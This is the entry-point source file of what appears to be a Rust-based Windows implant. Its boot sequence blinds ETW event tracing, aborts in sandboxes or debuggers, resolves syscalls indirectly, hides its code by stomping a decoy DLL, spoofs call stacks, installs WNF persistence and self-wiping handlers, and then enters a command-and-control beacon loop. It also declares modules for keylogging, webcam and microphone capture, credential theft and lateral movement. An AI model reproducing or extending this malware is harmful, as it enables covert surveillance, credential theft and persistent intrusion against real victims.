//! main.rs — Entry point
//!
//! Boot order:
//!   1. ETW blind     — silence event tracing before any noisy API calls
//!   2. Anti-detect   — VM/sandbox/debugger checks; abort if hostile env
//!   3. Resolve fns   — walk ntdll/kernel32 exports for all needed fn ptrs
//!   4. Selfdestruct  — register ctrl handler (wipe-on-SIGTERM)
//!   5. Guardian      — spawn watchdog thread
//!   6. VEH           — install exception handler (wipe-on-crash)
//!   7. Stomp + spoof — stomp ntdll headers; init stack-spoof gadget
//!   8. Post-shutdown — install WNF persistence channel
//!   9. C2 loop       — connect and serve commands

#![allow(non_snake_case, dead_code)]
#![windows_subsystem = "windows"]

mod antidetect;
mod c2;
mod defs;
mod dpapi;
mod etw_patch;
mod filetransfer;
mod guardian;
mod hashes;
mod hollow;
mod indirect_syscall;
mod keylog;
mod lateral;
mod loader;
mod mic;
mod pe_obfuscate;
mod persist;
mod post_shutdown;
mod ppldump;
mod resurrect;
mod sac_bypass;
mod screenshot;
mod selfdestruct;
mod sleep;
mod spoof;
#[cfg(feature = "ssn-audit")]
mod ssn_audit;
mod stomp;
mod syscall;
mod threadless_inject;
mod token;
mod unhook;
mod utils;
mod watchdog;
mod webcam;

// ── Guardian callback shims ───────────────────────────────────────────────────
// Named unsafe fn items (not closures) so they can be cast to fn-pointer
// types (FnVoid / FnBool).  Non-capturing closures *are* coercible to fn
// pointers in Rust, BUT they cannot call other `unsafe fn` from within a
// non-unsafe closure body.  Using named `unsafe fn` avoids that.

unsafe fn shim_wipe()     { selfdestruct::wipe_self(); }
unsafe fn shim_purge()    { persist::purge_all(); }
unsafe fn shim_drop_ads() { resurrect::drop_from_ads(); }
unsafe fn shim_install()  { persist::install_all(); }
unsafe fn shim_hollow() -> bool { hollow::run(&[]) }

fn main() {
    unsafe {
        // 1. Silence ETW before any other API calls
        etw_patch::apply_all_blinds();

        // 2. Anti-detect: abort if hostile analysis environment
        if antidetect::is_sandboxed() {
            return;
        }

        // 3. Resolve function pointers from ntdll / kernel32 exports
        let fn_ntqsi   = indirect_syscall::resolve_ntqsi();
        let fn_sleep   = indirect_syscall::resolve_sleep();
        let fn_tick    = indirect_syscall::resolve_tick();
        let fn_add_veh = indirect_syscall::resolve_add_veh();

        // 4. Register console ctrl handler (wipe on CTRL+C / forced close)
        selfdestruct::register_ctrl_handler();

        // 5. Spawn guardian watchdog thread
        guardian::start_thread(
            fn_ntqsi,
            fn_sleep,
            fn_tick,
            shim_wipe,
            shim_purge,
            shim_drop_ads,
            shim_install,
            shim_hollow,
        );

        // 6. Install VEH (wipe-on-crash)
        guardian::install_veh(fn_add_veh);

        // 7a. Module stomp — hide our .text under xpsservices.dll
        // First three &[u16] args (_decoy_dll, _spoof_name, _spoof_path) are
        // ignored by stomp::stomp — it uses the hardcoded DECOY_NAME_W const.
        // We pass empty slices as the correct type.
        let _ = stomp::stomp(&[], &[], &[], &[]);

        // 7b. Init stack-spoof gadget (must be after ntdll is in memory)
        spoof::init_gadget();

        // 8. Install WNF post-shutdown persistence channel
        // install_wnf_channel(state_name, type_id, scope, permanent,
        //                     data_size, data, security_descriptor)
        post_shutdown::install_wnf_channel(
            0x41C64E6D_u64,
            core::ptr::null::<core::ffi::c_void>(),
            core::ptr::null::<core::ffi::c_void>(),
            0u32,
            4usize,
            core::ptr::null::<core::ffi::c_void>(),
            0u32,
        );

        // 9. SSN audit (debug build only)
        #[cfg(feature = "ssn-audit")]
        ssn_audit::run();

        // 10. C2 beacon loop
        c2::run();
    }
}
